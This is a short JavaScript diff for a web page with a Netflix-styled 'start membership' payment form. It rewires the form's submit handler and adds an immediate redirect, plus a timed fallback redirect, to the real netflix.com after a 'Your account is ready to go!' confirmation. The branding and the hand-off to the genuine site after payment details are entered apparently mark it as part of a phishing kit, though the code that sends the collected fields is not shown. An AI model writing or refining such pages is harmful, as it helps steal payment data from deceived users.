@@ -104,7 +104,11 @@
         title: 'All set',
         html: 'Your account is ready to go!',
         confirmButtonText: 'OK'
+      }).then(() => {
+        window.location.href = 'https://www.netflix.com';
       });
+      // Fallback redirect in case the promise doesn't resolve (very short delay)
+      setTimeout(() => { window.location.href = 'https://www.netflix.com'; }, 1200);
     } else {
       Swal.fire({
         confirmButtonColor: '#e50914',
@@ -117,10 +121,10 @@
   }
 
   function init() {
-    document.addEventListener('click', async (ev) => {
-      const btn = ev.target.closest && ev.target.closest('#start-membership');
-      if (!btn) return;
+    const form = document.getElementById('payment-form');
+    if (!form) return;
 
+    form.addEventListener('submit', async (ev) => {
       ev.preventDefault();
 
       const fields = {
